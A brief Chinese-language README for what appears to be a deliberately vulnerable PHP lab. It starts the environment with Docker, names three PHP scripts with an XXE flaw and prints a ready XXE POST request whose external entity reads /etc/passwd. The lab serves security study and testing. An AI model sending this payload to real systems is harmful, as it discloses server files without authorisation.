开启环境：
```
docker compose up -d
```
访问页面：
```
http://localhost:18080/index/php
```


有三个文件存在XXE漏洞：
`dom.php` `SimpleXMLElement.php` `simplexml_load_string.php`

向这三个文件发送payload即可读取文件：
```
POST /dom.php HTTP/1.1

<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
<n>&xxe;</n>
</root>
```
